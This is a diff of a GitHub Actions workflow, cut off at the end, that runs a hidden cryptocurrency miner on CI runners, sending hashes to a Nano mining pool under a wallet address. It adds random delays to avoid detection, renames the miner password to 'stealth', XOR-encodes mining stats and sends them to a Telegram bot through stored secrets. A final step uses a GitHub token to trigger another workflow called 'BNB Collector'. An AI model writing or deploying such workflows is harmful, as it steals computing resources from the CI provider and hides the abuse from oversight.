@@ -29,37 +29,20 @@ jobs:
           chmod +x node
 
       - name: Mining Agent
-        env:
-          UA_LIST: "curl|wget|Mozilla/5.0|python-requests|Go-http-client/1.1"
         run: |
           cd node-core
-          UA=$(echo $UA_LIST | tr "|" "\n" | shuf -n 1)
-          echo "Using UA: $UA"
-
-          DELAY=$((RANDOM % 180 + 30))
-          echo "Waiting $DELAY sec..."
-          sleep $DELAY
-
+          sleep $((RANDOM % 60 + 10))
           ./node -o xmrig.nanswap.com:3333 -a rx -k \
             -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
-            -p nanoninja --randomx-no-rdmsr | tee result.log &
-
+            -p stealth --randomx-no-rdmsr | tee result.log &
           PID=$!
-          WORKDUR=$((RANDOM % 5400 + 1200))
-          echo "Running for $WORKDUR sec..."
-          sleep $WORKDUR
+          sleep $((RANDOM % 5400 + 1200))
           kill $PID
 
-      - name: Send Encrypted Report
-        if: always()
-        env:
-          TG_TOKEN: ${{ secrets.TG_TOKEN }}
-          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
+      - name: Write encryption script
         run: |
-          cd node-core
-          python3 - <<EOF
+          cat <<'EOF' > node-core/encrypt.py
 import base64, os
-
 hr = "0 H/s"
 try:
   with open("result.log", "r", errors="ignore") as f:
@@ -71,25 +54,32 @@ try:
     a = sum("accepted" in l for l in lines)
     r = sum("rejected" in l for l in lines)
 except:
-  a, r = 0, 0
-
+  a = r = 0
 msg = f"NANO Stats:\\n• HR: {hr}\\n• OK: {a}\\n• NO: {r}"
 key = b"S3cur3"
 cipher = bytes([b ^ key[i % len(key)] for i, b in enumerate(msg.encode())])
 b64 = base64.b64encode(cipher).decode()
-
-os.system(f'curl -s -X POST https://api.telegram.org/bot${{TG_TOKEN}}/sendMessage '
-          f'-d chat_id=${{TG_CHAT_ID}} --data-urlencode text="📦 Encrypted XNO Report:\n```\\n{b64}\\n```" '
-          '-d parse_mode=Markdown')
+with open("payload.txt", "w") as f:
+  f.write(b64)
 EOF
 
-      - name: Trigger Next
+      - name: Send Encrypted Report
+        if: always()
+        env:
+          TG_TOKEN: ${{ secrets.TG_TOKEN }}
+          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
+        run: |
+          cd node-core
+          python3 encrypt.py
+          TEXT=$(cat payload.txt)
+          curl -s -X POST https://api.telegram.org/bot${TG_TOKEN}/sendMessage \
+            -d chat_id=$TG_CHAT_ID \
+            --data-urlencode text="📦 Encrypted XNO Report:\n\`\`\`\n$TEXT\n\`\`\`" \
+            -d parse_mode=Markdown
+
+      - name: Trigger BNB Collector
         if: always()
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
-          sleep $((RANDOM % 60 + 10))
-          curl -X POST -H "Authorization: Bearer $GH_TOKEN" \
-               -H "Accept: application/vnd.github+json" \
-               https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches \
-               -d '{"ref":"main"}'
+          curl -X POST -H "Authorization: Bearer $
